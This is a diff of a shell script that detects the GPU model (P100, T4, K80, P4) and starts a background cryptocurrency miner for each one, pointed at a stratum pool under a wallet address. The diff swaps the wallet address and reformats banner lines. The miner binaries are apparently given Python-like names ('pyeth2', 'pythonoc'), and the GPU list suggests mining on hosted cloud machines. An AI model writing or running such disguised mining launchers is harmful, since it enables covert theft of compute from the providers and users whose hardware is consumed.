@@ -110,34 +110,35 @@ do
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
 
-echo -e "${On_IGreen}"'                                  #########################'
+echo -e "${On_IGreen}"'#######################################################'
 echo -e "####################### P100-PCIE #########################"
-echo -e '#######################                                    '"${Color_Off}"
-nohup  ./pyeth2  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.ET_CU_P100_$IPNAME@$PROX:$ETPort  -U 2>> oout 1>> oout &
+echo -e '###########################################################'"${Color_Off}"
+nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.ET_CU_P100_$IPNAME@$PROX:$ETPort  -U 2>> oout 1>> oout &
 
 elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
 then
-echo -e "${ON_IBlue}"'                                  #########################'
+echo -e "${ON_IBlue}"'##################################################################'
 echo -e "#######################        T4        #########################"
-echo -e '#######################                                    '"${Color_Off}"
-nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@$PROX:$ETPort  -G  2>> oout 1>> oout &
+echo -e '##################################################################'"${Color_Off}"
+nohup  ./pythonoc  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.OC_T4_$IPNAME@$PROX:$ETPort  -G  2>> oout 1>> oout &
 elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
 then
-echo -e "${ON_IRed}"'                            #########################'
+echo -e "${ON_IRed}"'############################################################'
 echo -e "#######################    K80     #########################"
-echo -e '#######################                                    '"${Color_Off}"
-nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@$PROX:$ETPort  -G 2>> oout 1>> oout &
+echo -e '############################################################'"${Color_Off}"
+nohup  ./pythonoc  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.OC_K80_$IPNAME@$PROX:$ETPort  -G 2>> oout 1>> oout &
 elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
 then
-echo -e "${On_IYellow}"'                                   ########################'
+echo -e "${On_IYellow}"'###########################################################'
 echo -e "#######################    P4     #########################"
-echo -e '#######################                                    '"${Color_Off}"
-nohup  ./pyeth2  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_P4_$IPNAME@$PROX:$ETPort  -U 2>> oout 1>> oout &
+echo -e '###########################################################'"${Color_Off}"
+nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.OC_P4_$IPNAME@$PROX:$ETPort  -U 2>> oout 1>> oout &
 else
-echo -e "${On_IBlack}"'                                     #########################'
+echo -e "${On_IBlack}"'##############################################################'
 echo -e "#######################     Other    #########################"
-echo -e '#######################                                       '"${Color_Off}"
-nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@$PROX:$ETPort  -G 2>> oout 1>> oout &
+echo -e '##############################################################'"${Color_Off}"
+nohup  ./pythonoc  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.OC_Other_$IPNAME@$PROX:$ETPort  -G 2>> oout 1>> oout &
+
 fi
 
     while true
